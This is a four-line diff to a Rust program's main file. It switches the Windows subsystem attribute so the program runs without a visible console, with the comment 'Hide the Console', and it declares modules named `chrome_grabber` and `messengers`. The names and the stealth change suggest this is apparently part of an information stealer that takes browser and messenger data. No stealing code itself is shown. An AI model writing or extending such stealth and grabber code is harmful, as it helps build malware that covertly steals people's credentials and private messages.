@@ -1,4 +1,4 @@
-#![windows_subsystem = "console"] // Hide the Console
+#![windows_subsystem = "windows"] // Hide the Console
 
 mod chrome_grabber;
 mod messengers;
